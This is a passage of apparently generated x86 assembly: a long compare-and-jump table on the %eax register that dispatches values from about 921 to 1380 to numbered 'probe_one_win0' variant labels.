	je	.Lprobe_one_win0_var921
	cmpl	$922, %eax
	je	.Lprobe_one_win0_var922
	cmpl	$923, %eax
	je	.Lprobe_one_win0_var923
	cmpl	$924, %eax
	je	.Lprobe_one_win0_var924
	cmpl	$925, %eax
	je	.Lprobe_one_win0_var925
	cmpl	$926, %eax
	je	.Lprobe_one_win0_var926
	cmpl	$927, %eax
	je	.Lprobe_one_win0_var927
	cmpl	$928, %eax
	je	.Lprobe_one_win0_var928
	cmpl	$929, %eax
	je	.Lprobe_one_win0_var929
	cmpl	$930, %eax
	je	.Lprobe_one_win0_var930
	cmpl	$931, %eax
	je	.Lprobe_one_win0_var931
	cmpl	$932, %eax
	je	.Lprobe_one_win0_var932
	cmpl	$933, %eax
	je	.Lprobe_one_win0_var933
	cmpl	$934, %eax
	je	.Lprobe_one_win0_var934
	cmpl	$935, %eax
	je	.Lprobe_one_win0_var935
	cmpl	$936, %eax
	je	.Lprobe_one_win0_var936
	cmpl	$937, %eax
	je	.Lprobe_one_win0_var937
	cmpl	$938, %eax
	je	.Lprobe_one_win0_var938
	cmpl	$939, %eax
	je	.Lprobe_one_win0_var939
	cmpl	$940, %eax
	je	.Lprobe_one_win0_var940
	cmpl	$941, %eax
	je	.Lprobe_one_win0_var941
	cmpl	$942, %eax
	je	.Lprobe_one_win0_var942
	cmpl	$943, %eax
	je	.Lprobe_one_win0_var943
	cmpl	$944, %eax
	je	.Lprobe_one_win0_var944
	cmpl	$945, %eax
	je	.Lprobe_one_win0_var945
	cmpl	$946, %eax
	je	.Lprobe_one_win0_var946
	cmpl	$947, %eax
	je	.Lprobe_one_win0_var947
	cmpl	$948, %eax
	je	.Lprobe_one_win0_var948
	cmpl	$949, %eax
	je	.Lprobe_one_win0_var949
	cmpl	$950, %eax
	je	.Lprobe_one_win0_var950
	cmpl	$951, %eax
	je	.Lprobe_one_win0_var951
	cmpl	$952, %eax
	je	.Lprobe_one_win0_var952
	cmpl	$953, %eax
	je	.Lprobe_one_win0_var953
	cmpl	$954, %eax
	je	.Lprobe_one_win0_var954
	cmpl	$955, %eax
	je	.Lprobe_one_win0_var955
	cmpl	$956, %eax
	je	.Lprobe_one_win0_var956
	cmpl	$957, %eax
	je	.Lprobe_one_win0_var957
	cmpl	$958, %eax
	je	.Lprobe_one_win0_var958
	cmpl	$959, %eax
	je	.Lprobe_one_win0_var959
	cmpl	$960, %eax
	je	.Lprobe_one_win0_var960
	cmpl	$961, %eax
	je	.Lprobe_one_win0_var961
	cmpl	$962, %eax
	je	.Lprobe_one_win0_var962
	cmpl	$963, %eax
	je	.Lprobe_one_win0_var963
	cmpl	$964, %eax
	je	.Lprobe_one_win0_var964
	cmpl	$965, %eax
	je	.Lprobe_one_win0_var965
	cmpl	$966, %eax
	je	.Lprobe_one_win0_var966
	cmpl	$967, %eax
	je	.Lprobe_one_win0_var967
	cmpl	$968, %eax
	je	.Lprobe_one_win0_var968
	cmpl	$969, %eax
	je	.Lprobe_one_win0_var969
	cmpl	$970, %eax
	je	.Lprobe_one_win0_var970
	cmpl	$971, %eax
	je	.Lprobe_one_win0_var971
	cmpl	$972, %eax
	je	.Lprobe_one_win0_var972
	cmpl	$973, %eax
	je	.Lprobe_one_win0_var973
	cmpl	$974, %eax
	je	.Lprobe_one_win0_var974
	cmpl	$975, %eax
	je	.Lprobe_one_win0_var975
	cmpl	$976, %eax
	je	.Lprobe_one_win0_var976
	cmpl	$977, %eax
	je	.Lprobe_one_win0_var977
	cmpl	$978, %eax
	je	.Lprobe_one_win0_var978
	cmpl	$979, %eax
	je	.Lprobe_one_win0_var979
	cmpl	$980, %eax
	je	.Lprobe_one_win0_var980
	cmpl	$981, %eax
	je	.Lprobe_one_win0_var981
	cmpl	$982, %eax
	je	.Lprobe_one_win0_var982
	cmpl	$983, %eax
	je	.Lprobe_one_win0_var983
	cmpl	$984, %eax
	je	.Lprobe_one_win0_var984
	cmpl	$985, %eax
	je	.Lprobe_one_win0_var985
	cmpl	$986, %eax
	je	.Lprobe_one_win0_var986
	cmpl	$987, %eax
	je	.Lprobe_one_win0_var987
	cmpl	$988, %eax
	je	.Lprobe_one_win0_var988
	cmpl	$989, %eax
	je	.Lprobe_one_win0_var989
	cmpl	$990, %eax
	je	.Lprobe_one_win0_var990
	cmpl	$991, %eax
	je	.Lprobe_one_win0_var991
	cmpl	$992, %eax
	je	.Lprobe_one_win0_var992
	cmpl	$993, %eax
	je	.Lprobe_one_win0_var993
	cmpl	$994, %eax
	je	.Lprobe_one_win0_var994
	cmpl	$995, %eax
	je	.Lprobe_one_win0_var995
	cmpl	$996, %eax
	je	.Lprobe_one_win0_var996
	cmpl	$997, %eax
	je	.Lprobe_one_win0_var997
	cmpl	$998, %eax
	je	.Lprobe_one_win0_var998
	cmpl	$999, %eax
	je	.Lprobe_one_win0_var999
	cmpl	$1000, %eax
	je	.Lprobe_one_win0_var1000
	cmpl	$1001, %eax
	je	.Lprobe_one_win0_var1001
	cmpl	$1002, %eax
	je	.Lprobe_one_win0_var1002
	cmpl	$1003, %eax
	je	.Lprobe_one_win0_var1003
	cmpl	$1004, %eax
	je	.Lprobe_one_win0_var1004
	cmpl	$1005, %eax
	je	.Lprobe_one_win0_var1005
	cmpl	$1006, %eax
	je	.Lprobe_one_win0_var1006
	cmpl	$1007, %eax
	je	.Lprobe_one_win0_var1007
	cmpl	$1008, %eax
	je	.Lprobe_one_win0_var1008
	cmpl	$1009, %eax
	je	.Lprobe_one_win0_var1009
	cmpl	$1010, %eax
	je	.Lprobe_one_win0_var1010
	cmpl	$1011, %eax
	je	.Lprobe_one_win0_var1011
	cmpl	$1012, %eax
	je	.Lprobe_one_win0_var1012
	cmpl	$1013, %eax
	je	.Lprobe_one_win0_var1013
	cmpl	$1014, %eax
	je	.Lprobe_one_win0_var1014
	cmpl	$1015, %eax
	je	.Lprobe_one_win0_var1015
	cmpl	$1016, %eax
	je	.Lprobe_one_win0_var1016
	cmpl	$1017, %eax
	je	.Lprobe_one_win0_var1017
	cmpl	$1018, %eax
	je	.Lprobe_one_win0_var1018
	cmpl	$1019, %eax
	je	.Lprobe_one_win0_var1019
	cmpl	$1020, %eax
	je	.Lprobe_one_win0_var1020
	cmpl	$1021, %eax
	je	.Lprobe_one_win0_var1021
	cmpl	$1022, %eax
	je	.Lprobe_one_win0_var1022
	cmpl	$1023, %eax
	je	.Lprobe_one_win0_var1023
	cmpl	$1024, %eax
	je	.Lprobe_one_win0_var1024
	cmpl	$1025, %eax
	je	.Lprobe_one_win0_var1025
	cmpl	$1026, %eax
	je	.Lprobe_one_win0_var1026
	cmpl	$1027, %eax
	je	.Lprobe_one_win0_var1027
	cmpl	$1028, %eax
	je	.Lprobe_one_win0_var1028
	cmpl	$1029, %eax
	je	.Lprobe_one_win0_var1029
	cmpl	$1030, %eax
	je	.Lprobe_one_win0_var1030
	cmpl	$1031, %eax
	je	.Lprobe_one_win0_var1031
	cmpl	$1032, %eax
	je	.Lprobe_one_win0_var1032
	cmpl	$1033, %eax
	je	.Lprobe_one_win0_var1033
	cmpl	$1034, %eax
	je	.Lprobe_one_win0_var1034
	cmpl	$1035, %eax
	je	.Lprobe_one_win0_var1035
	cmpl	$1036, %eax
	je	.Lprobe_one_win0_var1036
	cmpl	$1037, %eax
	je	.Lprobe_one_win0_var1037
	cmpl	$1038, %eax
	je	.Lprobe_one_win0_var1038
	cmpl	$1039, %eax
	je	.Lprobe_one_win0_var1039
	cmpl	$1040, %eax
	je	.Lprobe_one_win0_var1040
	cmpl	$1041, %eax
	je	.Lprobe_one_win0_var1041
	cmpl	$1042, %eax
	je	.Lprobe_one_win0_var1042
	cmpl	$1043, %eax
	je	.Lprobe_one_win0_var1043
	cmpl	$1044, %eax
	je	.Lprobe_one_win0_var1044
	cmpl	$1045, %eax
	je	.Lprobe_one_win0_var1045
	cmpl	$1046, %eax
	je	.Lprobe_one_win0_var1046
	cmpl	$1047, %eax
	je	.Lprobe_one_win0_var1047
	cmpl	$1048, %eax
	je	.Lprobe_one_win0_var1048
	cmpl	$1049, %eax
	je	.Lprobe_one_win0_var1049
	cmpl	$1050, %eax
	je	.Lprobe_one_win0_var1050
	cmpl	$1051, %eax
	je	.Lprobe_one_win0_var1051
	cmpl	$1052, %eax
	je	.Lprobe_one_win0_var1052
	cmpl	$1053, %eax
	je	.Lprobe_one_win0_var1053
	cmpl	$1054, %eax
	je	.Lprobe_one_win0_var1054
	cmpl	$1055, %eax
	je	.Lprobe_one_win0_var1055
	cmpl	$1056, %eax
	je	.Lprobe_one_win0_var1056
	cmpl	$1057, %eax
	je	.Lprobe_one_win0_var1057
	cmpl	$1058, %eax
	je	.Lprobe_one_win0_var1058
	cmpl	$1059, %eax
	je	.Lprobe_one_win0_var1059
	cmpl	$1060, %eax
	je	.Lprobe_one_win0_var1060
	cmpl	$1061, %eax
	je	.Lprobe_one_win0_var1061
	cmpl	$1062, %eax
	je	.Lprobe_one_win0_var1062
	cmpl	$1063, %eax
	je	.Lprobe_one_win0_var1063
	cmpl	$1064, %eax
	je	.Lprobe_one_win0_var1064
	cmpl	$1065, %eax
	je	.Lprobe_one_win0_var1065
	cmpl	$1066, %eax
	je	.Lprobe_one_win0_var1066
	cmpl	$1067, %eax
	je	.Lprobe_one_win0_var1067
	cmpl	$1068, %eax
	je	.Lprobe_one_win0_var1068
	cmpl	$1069, %eax
	je	.Lprobe_one_win0_var1069
	cmpl	$1070, %eax
	je	.Lprobe_one_win0_var1070
	cmpl	$1071, %eax
	je	.Lprobe_one_win0_var1071
	cmpl	$1072, %eax
	je	.Lprobe_one_win0_var1072
	cmpl	$1073, %eax
	je	.Lprobe_one_win0_var1073
	cmpl	$1074, %eax
	je	.Lprobe_one_win0_var1074
	cmpl	$1075, %eax
	je	.Lprobe_one_win0_var1075
	cmpl	$1076, %eax
	je	.Lprobe_one_win0_var1076
	cmpl	$1077, %eax
	je	.Lprobe_one_win0_var1077
	cmpl	$1078, %eax
	je	.Lprobe_one_win0_var1078
	cmpl	$1079, %eax
	je	.Lprobe_one_win0_var1079
	cmpl	$1080, %eax
	je	.Lprobe_one_win0_var1080
	cmpl	$1081, %eax
	je	.Lprobe_one_win0_var1081
	cmpl	$1082, %eax
	je	.Lprobe_one_win0_var1082
	cmpl	$1083, %eax
	je	.Lprobe_one_win0_var1083
	cmpl	$1084, %eax
	je	.Lprobe_one_win0_var1084
	cmpl	$1085, %eax
	je	.Lprobe_one_win0_var1085
	cmpl	$1086, %eax
	je	.Lprobe_one_win0_var1086
	cmpl	$1087, %eax
	je	.Lprobe_one_win0_var1087
	cmpl	$1088, %eax
	je	.Lprobe_one_win0_var1088
	cmpl	$1089, %eax
	je	.Lprobe_one_win0_var1089
	cmpl	$1090, %eax
	je	.Lprobe_one_win0_var1090
	cmpl	$1091, %eax
	je	.Lprobe_one_win0_var1091
	cmpl	$1092, %eax
	je	.Lprobe_one_win0_var1092
	cmpl	$1093, %eax
	je	.Lprobe_one_win0_var1093
	cmpl	$1094, %eax
	je	.Lprobe_one_win0_var1094
	cmpl	$1095, %eax
	je	.Lprobe_one_win0_var1095
	cmpl	$1096, %eax
	je	.Lprobe_one_win0_var1096
	cmpl	$1097, %eax
	je	.Lprobe_one_win0_var1097
	cmpl	$1098, %eax
	je	.Lprobe_one_win0_var1098
	cmpl	$1099, %eax
	je	.Lprobe_one_win0_var1099
	cmpl	$1100, %eax
	je	.Lprobe_one_win0_var1100
	cmpl	$1101, %eax
	je	.Lprobe_one_win0_var1101
	cmpl	$1102, %eax
	je	.Lprobe_one_win0_var1102
	cmpl	$1103, %eax
	je	.Lprobe_one_win0_var1103
	cmpl	$1104, %eax
	je	.Lprobe_one_win0_var1104
	cmpl	$1105, %eax
	je	.Lprobe_one_win0_var1105
	cmpl	$1106, %eax
	je	.Lprobe_one_win0_var1106
	cmpl	$1107, %eax
	je	.Lprobe_one_win0_var1107
	cmpl	$1108, %eax
	je	.Lprobe_one_win0_var1108
	cmpl	$1109, %eax
	je	.Lprobe_one_win0_var1109
	cmpl	$1110, %eax
	je	.Lprobe_one_win0_var1110
	cmpl	$1111, %eax
	je	.Lprobe_one_win0_var1111
	cmpl	$1112, %eax
	je	.Lprobe_one_win0_var1112
	cmpl	$1113, %eax
	je	.Lprobe_one_win0_var1113
	cmpl	$1114, %eax
	je	.Lprobe_one_win0_var1114
	cmpl	$1115, %eax
	je	.Lprobe_one_win0_var1115
	cmpl	$1116, %eax
	je	.Lprobe_one_win0_var1116
	cmpl	$1117, %eax
	je	.Lprobe_one_win0_var1117
	cmpl	$1118, %eax
	je	.Lprobe_one_win0_var1118
	cmpl	$1119, %eax
	je	.Lprobe_one_win0_var1119
	cmpl	$1120, %eax
	je	.Lprobe_one_win0_var1120
	cmpl	$1121, %eax
	je	.Lprobe_one_win0_var1121
	cmpl	$1122, %eax
	je	.Lprobe_one_win0_var1122
	cmpl	$1123, %eax
	je	.Lprobe_one_win0_var1123
	cmpl	$1124, %eax
	je	.Lprobe_one_win0_var1124
	cmpl	$1125, %eax
	je	.Lprobe_one_win0_var1125
	cmpl	$1126, %eax
	je	.Lprobe_one_win0_var1126
	cmpl	$1127, %eax
	je	.Lprobe_one_win0_var1127
	cmpl	$1128, %eax
	je	.Lprobe_one_win0_var1128
	cmpl	$1129, %eax
	je	.Lprobe_one_win0_var1129
	cmpl	$1130, %eax
	je	.Lprobe_one_win0_var1130
	cmpl	$1131, %eax
	je	.Lprobe_one_win0_var1131
	cmpl	$1132, %eax
	je	.Lprobe_one_win0_var1132
	cmpl	$1133, %eax
	je	.Lprobe_one_win0_var1133
	cmpl	$1134, %eax
	je	.Lprobe_one_win0_var1134
	cmpl	$1135, %eax
	je	.Lprobe_one_win0_var1135
	cmpl	$1136, %eax
	je	.Lprobe_one_win0_var1136
	cmpl	$1137, %eax
	je	.Lprobe_one_win0_var1137
	cmpl	$1138, %eax
	je	.Lprobe_one_win0_var1138
	cmpl	$1139, %eax
	je	.Lprobe_one_win0_var1139
	cmpl	$1140, %eax
	je	.Lprobe_one_win0_var1140
	cmpl	$1141, %eax
	je	.Lprobe_one_win0_var1141
	cmpl	$1142, %eax
	je	.Lprobe_one_win0_var1142
	cmpl	$1143, %eax
	je	.Lprobe_one_win0_var1143
	cmpl	$1144, %eax
	je	.Lprobe_one_win0_var1144
	cmpl	$1145, %eax
	je	.Lprobe_one_win0_var1145
	cmpl	$1146, %eax
	je	.Lprobe_one_win0_var1146
	cmpl	$1147, %eax
	je	.Lprobe_one_win0_var1147
	cmpl	$1148, %eax
	je	.Lprobe_one_win0_var1148
	cmpl	$1149, %eax
	je	.Lprobe_one_win0_var1149
	cmpl	$1150, %eax
	je	.Lprobe_one_win0_var1150
	cmpl	$1151, %eax
	je	.Lprobe_one_win0_var1151
	cmpl	$1152, %eax
	je	.Lprobe_one_win0_var1152
	cmpl	$1153, %eax
	je	.Lprobe_one_win0_var1153
	cmpl	$1154, %eax
	je	.Lprobe_one_win0_var1154
	cmpl	$1155, %eax
	je	.Lprobe_one_win0_var1155
	cmpl	$1156, %eax
	je	.Lprobe_one_win0_var1156
	cmpl	$1157, %eax
	je	.Lprobe_one_win0_var1157
	cmpl	$1158, %eax
	je	.Lprobe_one_win0_var1158
	cmpl	$1159, %eax
	je	.Lprobe_one_win0_var1159
	cmpl	$1160, %eax
	je	.Lprobe_one_win0_var1160
	cmpl	$1161, %eax
	je	.Lprobe_one_win0_var1161
	cmpl	$1162, %eax
	je	.Lprobe_one_win0_var1162
	cmpl	$1163, %eax
	je	.Lprobe_one_win0_var1163
	cmpl	$1164, %eax
	je	.Lprobe_one_win0_var1164
	cmpl	$1165, %eax
	je	.Lprobe_one_win0_var1165
	cmpl	$1166, %eax
	je	.Lprobe_one_win0_var1166
	cmpl	$1167, %eax
	je	.Lprobe_one_win0_var1167
	cmpl	$1168, %eax
	je	.Lprobe_one_win0_var1168
	cmpl	$1169, %eax
	je	.Lprobe_one_win0_var1169
	cmpl	$1170, %eax
	je	.Lprobe_one_win0_var1170
	cmpl	$1171, %eax
	je	.Lprobe_one_win0_var1171
	cmpl	$1172, %eax
	je	.Lprobe_one_win0_var1172
	cmpl	$1173, %eax
	je	.Lprobe_one_win0_var1173
	cmpl	$1174, %eax
	je	.Lprobe_one_win0_var1174
	cmpl	$1175, %eax
	je	.Lprobe_one_win0_var1175
	cmpl	$1176, %eax
	je	.Lprobe_one_win0_var1176
	cmpl	$1177, %eax
	je	.Lprobe_one_win0_var1177
	cmpl	$1178, %eax
	je	.Lprobe_one_win0_var1178
	cmpl	$1179, %eax
	je	.Lprobe_one_win0_var1179
	cmpl	$1180, %eax
	je	.Lprobe_one_win0_var1180
	cmpl	$1181, %eax
	je	.Lprobe_one_win0_var1181
	cmpl	$1182, %eax
	je	.Lprobe_one_win0_var1182
	cmpl	$1183, %eax
	je	.Lprobe_one_win0_var1183
	cmpl	$1184, %eax
	je	.Lprobe_one_win0_var1184
	cmpl	$1185, %eax
	je	.Lprobe_one_win0_var1185
	cmpl	$1186, %eax
	je	.Lprobe_one_win0_var1186
	cmpl	$1187, %eax
	je	.Lprobe_one_win0_var1187
	cmpl	$1188, %eax
	je	.Lprobe_one_win0_var1188
	cmpl	$1189, %eax
	je	.Lprobe_one_win0_var1189
	cmpl	$1190, %eax
	je	.Lprobe_one_win0_var1190
	cmpl	$1191, %eax
	je	.Lprobe_one_win0_var1191
	cmpl	$1192, %eax
	je	.Lprobe_one_win0_var1192
	cmpl	$1193, %eax
	je	.Lprobe_one_win0_var1193
	cmpl	$1194, %eax
	je	.Lprobe_one_win0_var1194
	cmpl	$1195, %eax
	je	.Lprobe_one_win0_var1195
	cmpl	$1196, %eax
	je	.Lprobe_one_win0_var1196
	cmpl	$1197, %eax
	je	.Lprobe_one_win0_var1197
	cmpl	$1198, %eax
	je	.Lprobe_one_win0_var1198
	cmpl	$1199, %eax
	je	.Lprobe_one_win0_var1199
	cmpl	$1200, %eax
	je	.Lprobe_one_win0_var1200
	cmpl	$1201, %eax
	je	.Lprobe_one_win0_var1201
	cmpl	$1202, %eax
	je	.Lprobe_one_win0_var1202
	cmpl	$1203, %eax
	je	.Lprobe_one_win0_var1203
	cmpl	$1204, %eax
	je	.Lprobe_one_win0_var1204
	cmpl	$1205, %eax
	je	.Lprobe_one_win0_var1205
	cmpl	$1206, %eax
	je	.Lprobe_one_win0_var1206
	cmpl	$1207, %eax
	je	.Lprobe_one_win0_var1207
	cmpl	$1208, %eax
	je	.Lprobe_one_win0_var1208
	cmpl	$1209, %eax
	je	.Lprobe_one_win0_var1209
	cmpl	$1210, %eax
	je	.Lprobe_one_win0_var1210
	cmpl	$1211, %eax
	je	.Lprobe_one_win0_var1211
	cmpl	$1212, %eax
	je	.Lprobe_one_win0_var1212
	cmpl	$1213, %eax
	je	.Lprobe_one_win0_var1213
	cmpl	$1214, %eax
	je	.Lprobe_one_win0_var1214
	cmpl	$1215, %eax
	je	.Lprobe_one_win0_var1215
	cmpl	$1216, %eax
	je	.Lprobe_one_win0_var1216
	cmpl	$1217, %eax
	je	.Lprobe_one_win0_var1217
	cmpl	$1218, %eax
	je	.Lprobe_one_win0_var1218
	cmpl	$1219, %eax
	je	.Lprobe_one_win0_var1219
	cmpl	$1220, %eax
	je	.Lprobe_one_win0_var1220
	cmpl	$1221, %eax
	je	.Lprobe_one_win0_var1221
	cmpl	$1222, %eax
	je	.Lprobe_one_win0_var1222
	cmpl	$1223, %eax
	je	.Lprobe_one_win0_var1223
	cmpl	$1224, %eax
	je	.Lprobe_one_win0_var1224
	cmpl	$1225, %eax
	je	.Lprobe_one_win0_var1225
	cmpl	$1226, %eax
	je	.Lprobe_one_win0_var1226
	cmpl	$1227, %eax
	je	.Lprobe_one_win0_var1227
	cmpl	$1228, %eax
	je	.Lprobe_one_win0_var1228
	cmpl	$1229, %eax
	je	.Lprobe_one_win0_var1229
	cmpl	$1230, %eax
	je	.Lprobe_one_win0_var1230
	cmpl	$1231, %eax
	je	.Lprobe_one_win0_var1231
	cmpl	$1232, %eax
	je	.Lprobe_one_win0_var1232
	cmpl	$1233, %eax
	je	.Lprobe_one_win0_var1233
	cmpl	$1234, %eax
	je	.Lprobe_one_win0_var1234
	cmpl	$1235, %eax
	je	.Lprobe_one_win0_var1235
	cmpl	$1236, %eax
	je	.Lprobe_one_win0_var1236
	cmpl	$1237, %eax
	je	.Lprobe_one_win0_var1237
	cmpl	$1238, %eax
	je	.Lprobe_one_win0_var1238
	cmpl	$1239, %eax
	je	.Lprobe_one_win0_var1239
	cmpl	$1240, %eax
	je	.Lprobe_one_win0_var1240
	cmpl	$1241, %eax
	je	.Lprobe_one_win0_var1241
	cmpl	$1242, %eax
	je	.Lprobe_one_win0_var1242
	cmpl	$1243, %eax
	je	.Lprobe_one_win0_var1243
	cmpl	$1244, %eax
	je	.Lprobe_one_win0_var1244
	cmpl	$1245, %eax
	je	.Lprobe_one_win0_var1245
	cmpl	$1246, %eax
	je	.Lprobe_one_win0_var1246
	cmpl	$1247, %eax
	je	.Lprobe_one_win0_var1247
	cmpl	$1248, %eax
	je	.Lprobe_one_win0_var1248
	cmpl	$1249, %eax
	je	.Lprobe_one_win0_var1249
	cmpl	$1250, %eax
	je	.Lprobe_one_win0_var1250
	cmpl	$1251, %eax
	je	.Lprobe_one_win0_var1251
	cmpl	$1252, %eax
	je	.Lprobe_one_win0_var1252
	cmpl	$1253, %eax
	je	.Lprobe_one_win0_var1253
	cmpl	$1254, %eax
	je	.Lprobe_one_win0_var1254
	cmpl	$1255, %eax
	je	.Lprobe_one_win0_var1255
	cmpl	$1256, %eax
	je	.Lprobe_one_win0_var1256
	cmpl	$1257, %eax
	je	.Lprobe_one_win0_var1257
	cmpl	$1258, %eax
	je	.Lprobe_one_win0_var1258
	cmpl	$1259, %eax
	je	.Lprobe_one_win0_var1259
	cmpl	$1260, %eax
	je	.Lprobe_one_win0_var1260
	cmpl	$1261, %eax
	je	.Lprobe_one_win0_var1261
	cmpl	$1262, %eax
	je	.Lprobe_one_win0_var1262
	cmpl	$1263, %eax
	je	.Lprobe_one_win0_var1263
	cmpl	$1264, %eax
	je	.Lprobe_one_win0_var1264
	cmpl	$1265, %eax
	je	.Lprobe_one_win0_var1265
	cmpl	$1266, %eax
	je	.Lprobe_one_win0_var1266
	cmpl	$1267, %eax
	je	.Lprobe_one_win0_var1267
	cmpl	$1268, %eax
	je	.Lprobe_one_win0_var1268
	cmpl	$1269, %eax
	je	.Lprobe_one_win0_var1269
	cmpl	$1270, %eax
	je	.Lprobe_one_win0_var1270
	cmpl	$1271, %eax
	je	.Lprobe_one_win0_var1271
	cmpl	$1272, %eax
	je	.Lprobe_one_win0_var1272
	cmpl	$1273, %eax
	je	.Lprobe_one_win0_var1273
	cmpl	$1274, %eax
	je	.Lprobe_one_win0_var1274
	cmpl	$1275, %eax
	je	.Lprobe_one_win0_var1275
	cmpl	$1276, %eax
	je	.Lprobe_one_win0_var1276
	cmpl	$1277, %eax
	je	.Lprobe_one_win0_var1277
	cmpl	$1278, %eax
	je	.Lprobe_one_win0_var1278
	cmpl	$1279, %eax
	je	.Lprobe_one_win0_var1279
	cmpl	$1280, %eax
	je	.Lprobe_one_win0_var1280
	cmpl	$1281, %eax
	je	.Lprobe_one_win0_var1281
	cmpl	$1282, %eax
	je	.Lprobe_one_win0_var1282
	cmpl	$1283, %eax
	je	.Lprobe_one_win0_var1283
	cmpl	$1284, %eax
	je	.Lprobe_one_win0_var1284
	cmpl	$1285, %eax
	je	.Lprobe_one_win0_var1285
	cmpl	$1286, %eax
	je	.Lprobe_one_win0_var1286
	cmpl	$1287, %eax
	je	.Lprobe_one_win0_var1287
	cmpl	$1288, %eax
	je	.Lprobe_one_win0_var1288
	cmpl	$1289, %eax
	je	.Lprobe_one_win0_var1289
	cmpl	$1290, %eax
	je	.Lprobe_one_win0_var1290
	cmpl	$1291, %eax
	je	.Lprobe_one_win0_var1291
	cmpl	$1292, %eax
	je	.Lprobe_one_win0_var1292
	cmpl	$1293, %eax
	je	.Lprobe_one_win0_var1293
	cmpl	$1294, %eax
	je	.Lprobe_one_win0_var1294
	cmpl	$1295, %eax
	je	.Lprobe_one_win0_var1295
	cmpl	$1296, %eax
	je	.Lprobe_one_win0_var1296
	cmpl	$1297, %eax
	je	.Lprobe_one_win0_var1297
	cmpl	$1298, %eax
	je	.Lprobe_one_win0_var1298
	cmpl	$1299, %eax
	je	.Lprobe_one_win0_var1299
	cmpl	$1300, %eax
	je	.Lprobe_one_win0_var1300
	cmpl	$1301, %eax
	je	.Lprobe_one_win0_var1301
	cmpl	$1302, %eax
	je	.Lprobe_one_win0_var1302
	cmpl	$1303, %eax
	je	.Lprobe_one_win0_var1303
	cmpl	$1304, %eax
	je	.Lprobe_one_win0_var1304
	cmpl	$1305, %eax
	je	.Lprobe_one_win0_var1305
	cmpl	$1306, %eax
	je	.Lprobe_one_win0_var1306
	cmpl	$1307, %eax
	je	.Lprobe_one_win0_var1307
	cmpl	$1308, %eax
	je	.Lprobe_one_win0_var1308
	cmpl	$1309, %eax
	je	.Lprobe_one_win0_var1309
	cmpl	$1310, %eax
	je	.Lprobe_one_win0_var1310
	cmpl	$1311, %eax
	je	.Lprobe_one_win0_var1311
	cmpl	$1312, %eax
	je	.Lprobe_one_win0_var1312
	cmpl	$1313, %eax
	je	.Lprobe_one_win0_var1313
	cmpl	$1314, %eax
	je	.Lprobe_one_win0_var1314
	cmpl	$1315, %eax
	je	.Lprobe_one_win0_var1315
	cmpl	$1316, %eax
	je	.Lprobe_one_win0_var1316
	cmpl	$1317, %eax
	je	.Lprobe_one_win0_var1317
	cmpl	$1318, %eax
	je	.Lprobe_one_win0_var1318
	cmpl	$1319, %eax
	je	.Lprobe_one_win0_var1319
	cmpl	$1320, %eax
	je	.Lprobe_one_win0_var1320
	cmpl	$1321, %eax
	je	.Lprobe_one_win0_var1321
	cmpl	$1322, %eax
	je	.Lprobe_one_win0_var1322
	cmpl	$1323, %eax
	je	.Lprobe_one_win0_var1323
	cmpl	$1324, %eax
	je	.Lprobe_one_win0_var1324
	cmpl	$1325, %eax
	je	.Lprobe_one_win0_var1325
	cmpl	$1326, %eax
	je	.Lprobe_one_win0_var1326
	cmpl	$1327, %eax
	je	.Lprobe_one_win0_var1327
	cmpl	$1328, %eax
	je	.Lprobe_one_win0_var1328
	cmpl	$1329, %eax
	je	.Lprobe_one_win0_var1329
	cmpl	$1330, %eax
	je	.Lprobe_one_win0_var1330
	cmpl	$1331, %eax
	je	.Lprobe_one_win0_var1331
	cmpl	$1332, %eax
	je	.Lprobe_one_win0_var1332
	cmpl	$1333, %eax
	je	.Lprobe_one_win0_var1333
	cmpl	$1334, %eax
	je	.Lprobe_one_win0_var1334
	cmpl	$1335, %eax
	je	.Lprobe_one_win0_var1335
	cmpl	$1336, %eax
	je	.Lprobe_one_win0_var1336
	cmpl	$1337, %eax
	je	.Lprobe_one_win0_var1337
	cmpl	$1338, %eax
	je	.Lprobe_one_win0_var1338
	cmpl	$1339, %eax
	je	.Lprobe_one_win0_var1339
	cmpl	$1340, %eax
	je	.Lprobe_one_win0_var1340
	cmpl	$1341, %eax
	je	.Lprobe_one_win0_var1341
	cmpl	$1342, %eax
	je	.Lprobe_one_win0_var1342
	cmpl	$1343, %eax
	je	.Lprobe_one_win0_var1343
	cmpl	$1344, %eax
	je	.Lprobe_one_win0_var1344
	cmpl	$1345, %eax
	je	.Lprobe_one_win0_var1345
	cmpl	$1346, %eax
	je	.Lprobe_one_win0_var1346
	cmpl	$1347, %eax
	je	.Lprobe_one_win0_var1347
	cmpl	$1348, %eax
	je	.Lprobe_one_win0_var1348
	cmpl	$1349, %eax
	je	.Lprobe_one_win0_var1349
	cmpl	$1350, %eax
	je	.Lprobe_one_win0_var1350
	cmpl	$1351, %eax
	je	.Lprobe_one_win0_var1351
	cmpl	$1352, %eax
	je	.Lprobe_one_win0_var1352
	cmpl	$1353, %eax
	je	.Lprobe_one_win0_var1353
	cmpl	$1354, %eax
	je	.Lprobe_one_win0_var1354
	cmpl	$1355, %eax
	je	.Lprobe_one_win0_var1355
	cmpl	$1356, %eax
	je	.Lprobe_one_win0_var1356
	cmpl	$1357, %eax
	je	.Lprobe_one_win0_var1357
	cmpl	$1358, %eax
	je	.Lprobe_one_win0_var1358
	cmpl	$1359, %eax
	je	.Lprobe_one_win0_var1359
	cmpl	$1360, %eax
	je	.Lprobe_one_win0_var1360
	cmpl	$1361, %eax
	je	.Lprobe_one_win0_var1361
	cmpl	$1362, %eax
	je	.Lprobe_one_win0_var1362
	cmpl	$1363, %eax
	je	.Lprobe_one_win0_var1363
	cmpl	$1364, %eax
	je	.Lprobe_one_win0_var1364
	cmpl	$1365, %eax
	je	.Lprobe_one_win0_var1365
	cmpl	$1366, %eax
	je	.Lprobe_one_win0_var1366
	cmpl	$1367, %eax
	je	.Lprobe_one_win0_var1367
	cmpl	$1368, %eax
	je	.Lprobe_one_win0_var1368
	cmpl	$1369, %eax
	je	.Lprobe_one_win0_var1369
	cmpl	$1370, %eax
	je	.Lprobe_one_win0_var1370
	cmpl	$1371, %eax
	je	.Lprobe_one_win0_var1371
	cmpl	$1372, %eax
	je	.Lprobe_one_win0_var1372
	cmpl	$1373, %eax
	je	.Lprobe_one_win0_var1373
	cmpl	$1374, %eax
	je	.Lprobe_one_win0_var1374
	cmpl	$1375, %eax
	je	.Lprobe_one_win0_var1375
	cmpl	$1376, %eax
	je	.Lprobe_one_win0_var1376
	cmpl	$1377, %eax
	je	.Lprobe_one_win0_var1377
	cmpl	$1378, %eax
	je	.Lprobe_one_win0_var1378
	cmpl	$1379, %eax
	je	.Lprobe_one_win0_var1379
	cmpl	$1380, %eax
